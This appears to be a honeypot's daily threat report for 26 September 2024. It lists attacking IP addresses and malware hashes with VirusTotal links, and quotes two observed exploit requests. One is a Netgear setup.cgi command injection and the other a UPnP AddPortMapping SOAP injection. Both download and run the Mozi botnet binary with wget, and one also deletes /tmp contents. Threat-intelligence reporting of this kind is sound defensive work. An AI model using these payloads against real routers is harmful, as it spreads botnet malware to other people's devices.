2024/09/26-09-2024

Top 5 IPs for 26-09-2024 :

170.64.151.98
139.198.124.249
203.163.247.224
50.18.81.129
200.108.131.1


Malware Observed:

File name : sshd
5fd59b445fed6efd5454850fd7fdf96bda3b095f2736c14763779f325ae121cf
https://www.virustotal.com/gui/file/5fd59b445fed6efd5454850fd7fdf96bda3b095f2736c14763779f325ae121cf

File name : sshd
94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00

e9b16c8bced0456b74b29b14cd9daf6d97a66e7ee31972941547a4f2e52cbc42
https://www.virustotal.com/gui/file/e9b16c8bced0456b74b29b14cd9daf6d97a66e7ee31972941547a4f2e52cbc42

73b320b1604b9b70f9e7d5f8b16c195c3ffffead63c345db29609c1d1f7e13f1
https://www.virustotal.com/gui/file/73b320b1604b9b70f9e7d5f8b16c195c3ffffead63c345db29609c1d1f7e13f1

922fdfa86b974b97ef28b75a6ed6984854c210b69cd87c26812fc42627c474f8
https://www.virustotal.com/gui/file/922fdfa86b974b97ef28b75a6ed6984854c210b69cd87c26812fc42627c474f8


Commands/exploits observed :

/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1


POST /picsdesc.xml HTTP/1.1
Content-Length: 630
Accept-Encoding: gzip, deflate
SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
Accept: /
User-Agent: Hello-World
Connection: keep-alive

<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope//" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>cd /var/; wget http://192.168.1.1:8088/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>

